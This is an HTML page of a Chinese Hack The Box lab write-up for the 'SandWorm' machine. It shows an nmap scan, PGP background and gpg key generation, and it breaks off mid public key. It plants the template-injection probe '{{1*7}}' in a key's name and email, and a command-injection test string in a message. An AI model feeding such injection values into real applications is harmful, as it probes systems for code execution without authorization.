@@ -1,0 +1,1164 @@
+<!DOCTYPE html>
+<html>
+<head>
+    
+
+    
+
+    
+
+
+
+    <meta name="referrer" content="no-referrer">
+    <meta charset="utf-8">
+    
+    
+    
+    
+    <title>SandWorm | Someb0dy&#39;s blog</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    
+    <meta name="theme-color" content="#3F51B5">
+    
+    
+    <meta name="keywords" content="gpg,ssti">
+    <meta name="description" content="2023年6月18日 10:10:16  Nmap┌──(root💀kali)-[~] └─# nmap -A 10.10.11.218                                                                                          130 ⨯ Starting Nmap 7.93 ( https:&#x2F;&#x2F;nmap.o">
+<meta name="keywords" content="gpg,ssti">
+<meta property="og:type" content="article">
+<meta property="og:title" content="SandWorm">
+<meta property="og:url" content="someb0dy.github.io/2023/06/26/SandWorm/index.html">
+<meta property="og:site_name" content="Someb0dy&#39;s blog">
+<meta property="og:description" content="2023年6月18日 10:10:16  Nmap┌──(root💀kali)-[~] └─# nmap -A 10.10.11.218                                                                                          130 ⨯ Starting Nmap 7.93 ( https:&#x2F;&#x2F;nmap.o">
+<meta property="og:locale" content="en">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2023/png/33561677/1687054354288-539d0598-5bfb-459f-ac1d-37b48ab3a4c8.png#averageHue=%23121212&clientId=u24caf7d4-3d45-4&from=paste&height=66&id=u3bab044a&originHeight=83&originWidth=352&originalType=binary&ratio=1&rotation=0&showTitle=false&size=2404&status=done&style=none&taskId=ua8a507b8-e0dc-4bab-b600-a23af129a41&title=&width=281.6">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2023/png/33561677/1687057542287-8b2243fc-355a-497e-99a4-833baaf0005c.png#averageHue=%23f5f5f5&clientId=u24caf7d4-3d45-4&from=paste&height=555&id=u7b46fd6e&originHeight=694&originWidth=724&originalType=binary&ratio=1&rotation=0&showTitle=false&size=122048&status=done&style=none&taskId=uda58e2a4-e803-47fc-946b-e8de653e6ce&title=&width=579.2">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2023/png/33561677/1687057369816-e1967b46-062f-4502-afd8-8f9d4be0bd4a.png#averageHue=%23f6e959&clientId=u24caf7d4-3d45-4&from=paste&height=775&id=uf20d10ed&originHeight=969&originWidth=1920&originalType=binary&ratio=1&rotation=0&showTitle=false&size=259932&status=done&style=none&taskId=u8edcd294-1a5f-414b-ae52-ede0f10e3f2&title=&width=1536">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2023/png/33561677/1687057433537-6205b925-91a0-4c6a-a080-1992e58377f1.png#averageHue=%232d2c2c&clientId=u24caf7d4-3d45-4&from=paste&height=660&id=u8b0ed1db&originHeight=825&originWidth=1605&originalType=binary&ratio=1&rotation=0&showTitle=false&size=297491&status=done&style=none&taskId=u0c8fc4be-457e-4c44-a1d7-0ee6143fdd2&title=&width=1284">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2023/png/33561677/1687057282934-b91ab264-1bba-4927-8ab1-0bbe5cf3996b.png#averageHue=%23f2f2f2&clientId=u24caf7d4-3d45-4&from=paste&height=698&id=u6b678055&originHeight=873&originWidth=1405&originalType=binary&ratio=1&rotation=0&showTitle=false&size=58120&status=done&style=none&taskId=u1fdc7540-1f2e-4e8d-bcb7-b3dc6001f75&title=&width=1124">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2023/png/33561677/1687057275780-1d51af6e-7fe4-4a13-a307-1e36d5bb5847.png#averageHue=%23fbfaf9&clientId=u24caf7d4-3d45-4&from=paste&height=782&id=u2008bf0b&originHeight=977&originWidth=1899&originalType=binary&ratio=1&rotation=0&showTitle=false&size=139528&status=done&style=none&taskId=u6ce15810-aaf8-46dd-8f55-4dfdd30b39d&title=&width=1519.2">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2023/png/33561677/1687269943532-7fc9252e-81af-40aa-a97d-f412efb8687e.png#averageHue=%23fbfafa&clientId=u10438d13-f564-4&from=paste&height=683&id=u34b05d46&originHeight=854&originWidth=1855&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=80980&status=done&style=none&taskId=uf592ea4f-6582-4827-a130-6f3a86d64b7&title=&width=1484">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2023/png/33561677/1687269955872-56386b5e-67f2-4b24-b5ac-a3eef800f5dd.png#averageHue=%23adadad&clientId=u10438d13-f564-4&from=paste&height=560&id=uf0d96c6b&originHeight=700&originWidth=1246&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=106187&status=done&style=none&taskId=u43345f0f-41f6-4791-8b40-f35385e3765&title=&width=996.8">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2023/png/33561677/1687272004020-93f360c8-a9dc-4803-a723-2218ac7ef05a.png#averageHue=%231a1a1a&clientId=u10438d13-f564-4&from=paste&height=323&id=ud70ed88d&originHeight=404&originWidth=1049&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=57489&status=done&style=none&taskId=ud82b9e3f-bbcb-4f7b-a340-9db54cc64af&title=&width=839.2">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2023/png/33561677/1687272043359-596db0cc-f38b-4da0-a029-bfe8781b8387.png#averageHue=%23fefdfd&clientId=u10438d13-f564-4&from=paste&height=493&id=uc87da8a7&originHeight=616&originWidth=1621&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=55606&status=done&style=none&taskId=ub4d845dd-b024-4717-bab1-5fd71ed0103&title=&width=1296.8">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2023/png/33561677/1687272035676-6f9cb6e1-af63-4907-8c4d-d7255b6f4cbc.png#averageHue=%23121212&clientId=u10438d13-f564-4&from=paste&height=702&id=ud55ce24c&originHeight=877&originWidth=1494&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=90717&status=done&style=none&taskId=u161064de-d1f8-4e2e-8444-2f8243632a0&title=&width=1195.2">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2023/png/33561677/1687277075182-92b11da2-a697-4a42-b6f6-3ffff74ea279.png#averageHue=%230e0e0e&clientId=u10438d13-f564-4&from=paste&height=636&id=u539d8aeb&originHeight=795&originWidth=1775&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=194498&status=done&style=none&taskId=u1e646fd1-cdc9-4cab-aa69-4d5a4bd1bd8&title=&width=1420">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2023/png/33561677/1687277184051-66f5ba7e-ebf0-419d-8dd1-018391e36ade.png#averageHue=%230f0f0f&clientId=u10438d13-f564-4&from=paste&height=444&id=u31a30930&originHeight=555&originWidth=1881&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=135603&status=done&style=none&taskId=ue09cf29c-54da-4b89-a7b7-bc1e3c9434b&title=&width=1504.8">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2023/png/33561677/1687278632201-69070476-d4e6-4dcd-84bb-c6320cd1f477.png#averageHue=%23141414&clientId=u10438d13-f564-4&from=paste&height=756&id=u63bf60c4&originHeight=945&originWidth=950&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=97821&status=done&style=none&taskId=u27159ebf-51d7-4a6c-a8eb-5e85ee80c25&title=&width=760">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2023/png/33561677/1687278681635-9af5b906-1d75-424a-a3db-239027ac8e0b.png#averageHue=%231d1d1d&clientId=u10438d13-f564-4&from=paste&height=155&id=ua0bd625b&originHeight=194&originWidth=880&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=27351&status=done&style=none&taskId=uab67ffac-e733-4f73-89b1-051d517f2cf&title=&width=704">
+<meta property="og:updated_time" content="2023-06-25T16:12:50.439Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://cdn.nlark.com/yuque/0/2023/png/33561677/1687054354288-539d0598-5bfb-459f-ac1d-37b48ab3a4c8.png#averageHue=%23121212&clientId=u24caf7d4-3d45-4&from=paste&height=66&id=u3bab044a&originHeight=83&originWidth=352&originalType=binary&ratio=1&rotation=0&showTitle=false&size=2404&status=done&style=none&taskId=ua8a507b8-e0dc-4bab-b600-a23af129a41&title=&width=281.6">
+    
+    <link rel="shortcut icon" href="/favicon.ico">
+    <link rel="stylesheet" href="//unpkg.com/hexo-theme-material-indigo@latest/css/style.css">
+    <script>window.lazyScripts=[]</script>
+
+    <!-- custom head -->
+    
+
+</head>
+
+<body>
+    <div id="loading" class="active"></div>
+
+    <aside id="menu" class="hide" >
+  <div class="inner flex-row-vertical">
+    <a href="javascript:;" target="_blank" rel="noopener" class="header-icon waves-effect waves-circle waves-light" id="menu-off">
+        <i class="icon icon-lg icon-close"></i>
+    </a>
+    <div class="brand-wrap" style="background-image:url(/img/brand.jpg)">
+      <div class="brand">
+        <a href="/" class="avatar waves-effect waves-circle waves-light">
+          <img src="/img/avatar.jpg">
+        </a>
+        <hgroup class="introduce">
+          <h5 class="nickname">Someb0dy</h5>
+          <a href="mailto:1362460837@qq.com" target="_blank" rel="noopener" title="1362460837@qq.com" class="mail">1362460837@qq.com</a>
+        </hgroup>
+      </div>
+    </div>
+    <div class="scroll-wrap flex-col">
+      <ul class="nav">
+        
+            <li class="waves-block waves-effect">
+              <a href="/"  >
+                <i class="icon icon-lg icon-home"></i>
+                主页
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="/archives"  >
+                <i class="icon icon-lg icon-archives"></i>
+                Archives
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="/tags"  >
+                <i class="icon icon-lg icon-tags"></i>
+                Tags
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="/categories"  >
+                <i class="icon icon-lg icon-th-list"></i>
+                Categories
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="https://github.com/Giraffe711" target="_blank" >
+                <i class="icon icon-lg icon-github"></i>
+                Github
+              </a>
+            </li>
+        
+      </ul>
+    </div>
+  </div>
+</aside>
+
+    <main id="main">
+        <header class="top-header" id="header">
+    <div class="flex-row">
+        <a href="javascript:;" target="_blank" rel="noopener" class="header-icon waves-effect waves-circle waves-light on" id="menu-toggle">
+          <i class="icon icon-lg icon-navicon"></i>
+        </a>
+        <div class="flex-col header-title ellipsis">SandWorm</div>
+        
+        <div class="search-wrap" id="search-wrap">
+            <a href="javascript:;" target="_blank" rel="noopener" class="header-icon waves-effect waves-circle waves-light" id="back">
+                <i class="icon icon-lg icon-chevron-left"></i>
+            </a>
+            <input type="text" id="key" class="search-input" autocomplete="off" placeholder="Search">
+            <a href="javascript:;" target="_blank" rel="noopener" class="header-icon waves-effect waves-circle waves-light" id="search">
+                <i class="icon icon-lg icon-search"></i>
+            </a>
+        </div>
+        
+        
+        <a href="javascript:;" target="_blank" rel="noopener" class="header-icon waves-effect waves-circle waves-light" id="menuShare">
+            <i class="icon icon-lg icon-share-alt"></i>
+        </a>
+        
+    </div>
+</header>
+<header class="content-header post-header">
+
+    <div class="container fade-scale">
+        <h1 class="title">SandWorm</h1>
+        <h5 class="subtitle">
+            
+                <time datetime="2023-06-25T16:10:34.992Z" itemprop="datePublished" class="page-time">
+  2023-06-26
+</time>
+
+
+	<ul class="article-category-list"><li class="article-category-list-item"><a class="article-category-list-link" href="/categories/HTB/">HTB</a></li></ul>
+
+            
+        </h5>
+    </div>
+
+    
+
+
+</header>
+
+
+<div class="container body-wrap">
+    
+    <aside class="post-widget">
+        <nav class="post-toc-wrap post-toc-shrink" id="post-toc">
+            <h4>TOC</h4>
+            <ol class="post-toc"><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#Nmap"><span class="post-toc-number">1.</span> <span class="post-toc-text">Nmap</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#ssa-htb"><span class="post-toc-number">2.</span> <span class="post-toc-text">ssa.htb</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#解密内容"><span class="post-toc-number">2.1.</span> <span class="post-toc-text">解密内容</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#验证签名"><span class="post-toc-number">2.2.</span> <span class="post-toc-text">验证签名</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#生成自己的公私钥信息以及签名信息"><span class="post-toc-number">2.3.</span> <span class="post-toc-text">生成自己的公私钥信息以及签名信息</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#反弹shell"><span class="post-toc-number">2.4.</span> <span class="post-toc-text">反弹shell</span></a></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#Root"><span class="post-toc-number">3.</span> <span class="post-toc-text">Root</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#null"><span class="post-toc-number">3.1.</span> <span class="post-toc-text"></span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#RustBackDoor"><span class="post-toc-number">3.2.</span> <span class="post-toc-text">RustBackDoor</span></a></li></ol></li></ol>
+        </nav>
+    </aside>
+
+
+<article id="post-SandWorm"
+  class="post-article article-type-post fade" itemprop="blogPost">
+
+    <div class="post-card">
+        <h1 class="post-card-title">SandWorm</h1>
+        <div class="post-meta">
+            <time class="post-time" title="2023-06-26 00:10:34" datetime="2023-06-25T16:10:34.992Z"  itemprop="datePublished">2023-06-26</time>
+
+            
+	<ul class="article-category-list"><li class="article-category-list-item"><a class="article-category-list-link" href="/categories/HTB/">HTB</a></li></ul>
+
+
+
+            
+<span id="busuanzi_container_page_pv" title="文章总阅读量" style='display:none'>
+    <i class="icon icon-eye icon-pr"></i><span id="busuanzi_value_page_pv"></span>
+</span>
+
+
+        </div>
+        <div class="post-content" id="post-content" itemprop="postContent">
+            <pre><code class="bash">2023年6月18日 10:10:16
+</code></pre>
+<h1 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a>Nmap</h1><pre><code class="bash">┌──(root💀kali)-[~]
+└─# nmap -A 10.10.11.218                                                                                          130 ⨯
+Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-17 22:09 EDT
+Nmap scan report for 10.10.11.218
+Host is up (0.32s latency).
+Not shown: 997 closed tcp ports (reset)
+PORT    STATE SERVICE  VERSION
+22/tcp  open  ssh      OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey:
+|   256 b7896c0b20ed49b2c1867c2992741c1f (ECDSA)
+|_  256 18cd9d08a621a8b8b6f79f8d405154fb (ED25519)
+80/tcp  open  http     nginx 1.18.0 (Ubuntu)
+|_http-server-header: nginx/1.18.0 (Ubuntu)
+|_http-title: Did not follow redirect to https://ssa.htb/
+443/tcp open  ssl/http nginx 1.18.0 (Ubuntu)
+|_http-title: Secret Spy Agency | Secret Security Service
+|_http-server-header: nginx/1.18.0 (Ubuntu)
+| ssl-cert: Subject: commonName=SSA/organizationName=Secret Spy Agency/stateOrProvinceName=Classified/countryName=SA
+| Not valid before: 2023-05-04T18:03:25
+|_Not valid after:  2050-09-19T18:03:25
+No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
+</code></pre>
+<p>开了22,80,443端口</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2023/png/33561677/1687054354288-539d0598-5bfb-459f-ac1d-37b48ab3a4c8.png#averageHue=%23121212&clientId=u24caf7d4-3d45-4&from=paste&height=66&id=u3bab044a&originHeight=83&originWidth=352&originalType=binary&ratio=1&rotation=0&showTitle=false&size=2404&status=done&style=none&taskId=ua8a507b8-e0dc-4bab-b600-a23af129a41&title=&width=281.6" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure> 修改hosts文件
+
+
+<h1 id="ssa-htb"><a href="#ssa-htb" class="headerlink" title="ssa.htb"></a>ssa.htb</h1><p>该网站是利用非对称加密算法技术来对内容进行加解密运算<br>运用的加密技术就是PGP 主要用于邮件加密方向的技术</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2023/png/33561677/1687057542287-8b2243fc-355a-497e-99a4-833baaf0005c.png#averageHue=%23f5f5f5&clientId=u24caf7d4-3d45-4&from=paste&height=555&id=u7b46fd6e&originHeight=694&originWidth=724&originalType=binary&ratio=1&rotation=0&showTitle=false&size=122048&status=done&style=none&taskId=uda58e2a4-e803-47fc-946b-e8de653e6ce&title=&width=579.2" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+<p>原理就是:<br>Encrypt</p>
+<ol>
+<li>在加密的时候，先生成一个(随机的)对称密钥，TlakvAQkCu2u，通过这个对称密码对data进行加密</li>
+<li>然后发送者通过接受者的公钥把这个随机生成的对称密钥进行加密，然后把经过<strong>对称</strong>密钥加密的Data和经过接受者公钥加密的对称密钥一起发送</li>
+</ol>
+<p>Decrypt</p>
+<ol>
+<li>先把Data和对称加密的密钥分离出来，此时这两个类型的数据都是加密的</li>
+<li>接受者通过自己的私钥先把对称密钥(q4fzNeBCRSyqv)解密得到TlakvAQkCu2u</li>
+<li>再使用对称密钥(TlakvAQkCu2u)对Data进行解密</li>
+</ol>
+<h2 id="解密内容"><a href="#解密内容" class="headerlink" title="解密内容"></a>解密内容</h2><pre><code class="bash">┌──(root💀kali)-[/home/kali/hacktheboxtools/machine/SandWorm]
+└─# cat message.txt                                                                                           
+nihao123;whaomi;#
+
+┌──(root💀kali)-[/home/kali/hacktheboxtools/machine/SandWorm]
+└─# gpg --encrypt --recipient-file id_rsa.pub message.txt
+File &#39;message.txt.gpg&#39; exists. Overwrite? (y/N) y
+
+┌──(root💀kali)-[/home/kali/hacktheboxtools/machine/SandWorm]
+└─# cat message.txt
+nihao123;whaomi;#
+
+
+┌──(root💀kali)-[/home/kali/hacktheboxtools/machine/SandWorm]
+└─# cat message.txt.gpg | base64
+hQIMA2u3M9ko0UzmAQ/+JxrwZH9aQaGjlJwO1Nv4k07oOq9Q8wgVScwXhVzgjeXnwC+/NX7caz3P
+P1ygbXNBsAbKykLMJG+EzjWmsG5fwnC8EqjK1fwtkNjERCwwA91s/OdoT788g8G1RzWFhi++JzWC
+bRuCokTb81ju7blnyJT/EhawTK/CcGUEhyEmGnQhmvKByWhQH1F3KJNPgHsvLkaXyNU/mXvXRyeU
+ljVAG5TaFL/yJPfoRGlXsBGfDXilsAk28IpM/dddkdLtgPzwoSLwc9B9mZgYuC67POFryDA4GmSW
+9qMo2P5SsNse1JXLExQPkaGbXrI1GTQFMZbpwHsTAS3riwaCEX8QipC2R4Z4j526/a15Bqkl10v3
+KEDB6wPDbPaT1/8yzb9OSssDy+RR1FDK8hK1eq84KmCXfB9NiVIBkdHrDycDni+LXPwZfytc6kja
+F7FseL0YgJBm5ou8r6SEvYMVkYyvANhziJLMt2Yc3XXKkiOIv6+ycmEGHwVC3qO0DJocGyzLSTy/
+a+sZyHxWi26ep5JYFokCRKx+SWSb/0ICkOPuMoulR8lGUSxEFtDlbuiPSXdTvc6eWPitoZa9qeIv
++xr//HFfB4JduiL0Rh3OqYJbmTU4oSZY7eTtSRnnD4ifKATazhxQwgkzPAiRBf+CDz2iCPThT7YO
+g1pkyG+10AVIQ6V0UQzSVwHFSXE/VUvur4u8j/WHIVk1MeE1nQ9t8sKvZZzCkWQxvGIYik2ZEUla
+tsVPsjytAoFvqR6hMqg/w3RyDLAgbdQX/t/u6JCC6GQYRthCiyfMtlB5PQKeGQ==
+
+┌──(root💀kali)-[/home/kali/hacktheboxtools/machine/SandWorm]
+</code></pre>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2023/png/33561677/1687057369816-e1967b46-062f-4502-afd8-8f9d4be0bd4a.png#averageHue=%23f6e959&clientId=u24caf7d4-3d45-4&from=paste&height=775&id=uf20d10ed&originHeight=969&originWidth=1920&originalType=binary&ratio=1&rotation=0&showTitle=false&size=259932&status=done&style=none&taskId=u8edcd294-1a5f-414b-ae52-ede0f10e3f2&title=&width=1536" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+<p>通过这个网站对加密的内容进行url编码</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2023/png/33561677/1687057433537-6205b925-91a0-4c6a-a080-1992e58377f1.png#averageHue=%232d2c2c&clientId=u24caf7d4-3d45-4&from=paste&height=660&id=u8b0ed1db&originHeight=825&originWidth=1605&originalType=binary&ratio=1&rotation=0&showTitle=false&size=297491&status=done&style=none&taskId=u0c8fc4be-457e-4c44-a1d7-0ee6143fdd2&title=&width=1284" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+
+<h2 id="验证签名"><a href="#验证签名" class="headerlink" title="验证签名"></a>验证签名</h2><figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2023/png/33561677/1687057282934-b91ab264-1bba-4927-8ab1-0bbe5cf3996b.png#averageHue=%23f2f2f2&clientId=u24caf7d4-3d45-4&from=paste&height=698&id=u6b678055&originHeight=873&originWidth=1405&originalType=binary&ratio=1&rotation=0&showTitle=false&size=58120&status=done&style=none&taskId=u1fdc7540-1f2e-4e8d-bcb7-b3dc6001f75&title=&width=1124" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+
+
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2023/png/33561677/1687057275780-1d51af6e-7fe4-4a13-a307-1e36d5bb5847.png#averageHue=%23fbfaf9&clientId=u24caf7d4-3d45-4&from=paste&height=782&id=u2008bf0b&originHeight=977&originWidth=1899&originalType=binary&ratio=1&rotation=0&showTitle=false&size=139528&status=done&style=none&taskId=u6ce15810-aaf8-46dd-8f55-4dfdd30b39d&title=&width=1519.2" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+<p>验证签名成功</p>
+<pre><code class="bash">Signature is valid!
+[GNUPG:] NEWSIG gpg: Signature made Thu 04 May 2023 04:13:47 PM UTC gpg: using RSA key D6BA9423021A0839CCC6F3C8C61D429110B625D4 
+[GNUPG:] KEY_CONSIDERED D6BA9423021A0839CCC6F3C8C61D429110B625D4 0 
+[GNUPG:] SIG_ID CsBPTL20G6/YKI6iNhSErGIXx5U 2023-05-04 1683216827 
+[GNUPG:] KEY_CONSIDERED D6BA9423021A0839CCC6F3C8C61D429110B625D4 0 
+[GNUPG:] GOODSIG C61D429110B625D4 SSA (Official PGP Key of the Secret Spy Agency.) gpg: Good signature from &quot;SSA (Official PGP Key of the Secret Spy Agency.) &quot; [ultimate] 
+[GNUPG:] VALIDSIG D6BA9423021A0839CCC6F3C8C61D429110B625D4 2023-05-04 1683216827 0 4 0 1 8 01 D6BA9423021A0839CCC6F3C8C61D429110B625D4 
+[GNUPG:] TRUST_ULTIMATE 0 pgp
+</code></pre>
+<p> 发现这里验证签名会验证信息，网站本身是flask 搭建的，想办法看看哪里可以ssti注入<br>网站的公私钥是使用gpg命令来实现的，我们看看常见的命令 </p>
+<pre><code class="bash">以下是 gpg 常见命令及其说明：
+
+gpg --gen-key: 生成一个新的密钥对，包括公钥和私钥。在生成过程中，您将需要输入名称、电子邮件地址和选定的密码等信息。
+
+gpg --list-keys: 列出所有已经生成的公钥。
+
+gpg --import &lt;filename&gt;: 导入公钥或者私钥文件。
+
+gpg --armor --export &lt;email&gt;: 导出指定邮箱的公钥，并把结果输出为 ASCII 编码的格式。
+
+gpg --encrypt --recipient &lt;recipient-email&gt; &lt;filename&gt;：使用指定接收者的公钥来加密文件，使其只能被其对应的私钥持有者解密。
+
+gpg --decrypt &lt;filename&gt;: 解密文件，前提是使用者必须拥有相应的私钥才行。
+
+gpg --verify &lt;filename&gt;: 验证签名文件是否和原始文件匹配。
+
+
+
+
+这些是最常用的 GPG 命令，但不止于此，GPG 还有许多其他命令。建议查看 GPG 的官方文档以获得更详细的信息。
+</code></pre>
+<pre><code class="bash">以下是和签名有关系的常见 GPG 命令及其说明：
+
+gpg --sign &lt;filename&gt;: 对文件进行数字签名。默认使用用户的默认密钥对进行签名，也可以指定其他密钥。
+
+gpg --clearsign &lt;filename&gt;: 对文件进行清晰签名。这种签名方式不会对整个文件进行加密，而是将签名附加到文件末尾，易于阅读。
+
+gpg --verify &lt;signed-filename&gt;: 验证数字签名是否有效，并检查签名是否由信任的密钥持有者创建。
+
+gpg --detach-sign &lt;filename&gt;: 生成一个独立的签名文件，而不是将签名附加到文件中。这种签名方式通常用于对二进制文件进行签名。
+
+gpg --clearsign &lt;filename&gt;: 对文本文件进行清晰签名。它会将签名附加到文件底部，方便人类阅读。
+
+这些是和签名相关的一些常见 GPG 命令，但还有许多其他命令。建议查看 GPG 的官方文档以获得更详细的信息。
+</code></pre>
+<h2 id="生成自己的公私钥信息以及签名信息"><a href="#生成自己的公私钥信息以及签名信息" class="headerlink" title="生成自己的公私钥信息以及签名信息"></a>生成自己的公私钥信息以及签名信息</h2><pre><code class="bash">
+┌──(root💀kali)-[/home/…/hacktheboxtools/machine/SandWorm/sign]
+└─# gpg --gen-key
+gpg (GnuPG) 2.2.40; Copyright (C) 2022 g10 Code GmbH
+This is free software: you are free to change and redistribute it.
+There is NO WARRANTY, to the extent permitted by law.
+
+Note: Use &quot;gpg --full-generate-key&quot; for a full featured key generation dialog.
+
+GnuPG needs to construct a user ID to identify your key.
+
+Real name: {{1*7}}@qq.com
+Email address: {{1*7}}@qq.com
+You selected this USER-ID:
+    &quot;{{1*7}}@qq.com &lt;{{1*7}}@qq.com&gt;&quot;
+
+Change (N)ame, (E)mail, or (O)kay/(Q)uit? O
+We need to generate a lot of random bytes. It is a good idea to perform
+some other action (type on the keyboard, move the mouse, utilize the
+disks) during the prime generation; this gives the random number
+generator a better chance to gain enough entropy.
+We need to generate a lot of random bytes. It is a good idea to perform
+some other action (type on the keyboard, move the mouse, utilize the
+disks) during the prime generation; this gives the random number
+generator a better chance to gain enough entropy.
+gpg: revocation certificate stored as &#39;/root/.gnupg/openpgp-revocs.d/7DEF520F8486A158CEFE281E3EF0D0B3755A0252.rev&#39;
+public and secret key created and signed.
+
+pub   rsa3072 2023-06-20 [SC] [expires: 2025-06-19]
+      7DEF520F8486A158CEFE281E3EF0D0B3755A0252
+uid                      {{1*7}}@qq.com &lt;{{1*7}}@qq.com&gt;
+sub   rsa3072 2023-06-20 [E] [expires: 2025-06-19]
+
+
+┌──(root💀kali)-[/home/…/hacktheboxtools/machine/SandWorm/sign]
+└─# ls
+
+┌──(root💀kali)-[/home/…/hacktheboxtools/machine/SandWorm/sign]
+└─# gpg --list-key
+gpg: checking the trustdb
+gpg: marginals needed: 3  completes needed: 1  trust model: pgp
+gpg: depth: 0  valid:   1  signed:   0  trust: 0-, 0q, 0n, 0m, 0f, 1u
+gpg: next trustdb check due at 2025-06-19
+/root/.gnupg/pubring.kbx
+------------------------
+pub   rsa3072 2023-06-20 [SC] [expires: 2025-06-19]
+      7DEF520F8486A158CEFE281E3EF0D0B3755A0252
+uid           [ultimate] {{1*7}}@qq.com &lt;{{1*7}}@qq.com&gt;
+sub   rsa3072 2023-06-20 [E] [expires: 2025-06-19]
+
+
+┌──(root💀kali)-[/home/…/hacktheboxtools/machine/SandWorm/sign]
+└─# echo test &gt; msg
+
+┌──(root💀kali)-[/home/…/hacktheboxtools/machine/SandWorm/sign]
+└─# ls
+msg
+
+┌──(root💀kali)-[/home/…/hacktheboxtools/machine/SandWorm/sign]
+└─# gpg --armor --export {{1*7}}@qq.com
+-----BEGIN PGP PUBLIC KEY BLOCK-----
+
+mQGNBGSRsVABDADPg1tNfZ73JoEo06M3vPrcUMhAjYfe6Rup16w9NWH4WjWmmVkJ
+FsCnNvl/uEAEhaYpNHBaiuvc0H3nVV9GYkd0SHF9uxeNHdEn6HgG/76KHM3Ht/3Y
+WFRlbx98mHcrJdJakhNhvWWE6SUtzvnp2zFanDfWDks1GIEMB9KGkf66AZE9qWcv
+PmogyZsSRTAHcg0Gper0uDoVmrR+zX1NI53gaGzB1JOcPrYKAForn5Dmd1eQScA7
+PKorW1Z4FaEuCEFYQOsN8LmruvUl04LTvFv4crDbfWhhF7RQ0aQbQd4LZJPndBf4
+jbq33eTjIFXIbxnxez8XcGnNyhnm2p6s1FAe4kpC9qYBxYTWY2no1mkV90W3hXuf
+3yWAxAdTn4mxlfiR128CvBVG7sXCYgGORajyKy5Y7kGSQds+S9zst1XN9twrfy37
+varDzuLOZ1aB6Qqt8qqTINLDEeUlpy7B8aTiLPkk4ZbJrbDoGcbO+gXYm9kpEIR3
+/fD8slb3o6hVMO8AEQEAAbQfe3sxKjd9fUBxcS5jb20gPHt7MSo3fX1AcXEuY29t
+PokB1AQTAQoAPhYhBH3vUg+EhqFYzv4oHj7w0LN1WgJSBQJkkbFQAhsDBQkDwmcA
+BQsJCAcCBhUKCQgLAgQWAgMBAh4BAheAAAoJED7w0LN1WgJS2lIMALBz4V3ixkIR
+xYZY37LyEHCcIR4IIkBpAJvFPDkY4E+NP1l8HpBOO1dHegKKmU+RPtHywsjTPdkx
+bjq/Q11Jr3G8fz3DPBSOG9iNutCN/LghhtuUPa7KIRxgjDjEU1sg/zYVSxQkOmKD
+irpN39VL8pFabPRogsaM4VfrN+pobL9mYp/yfqagj65aG5SDJq4jxY8yAIOTk31N
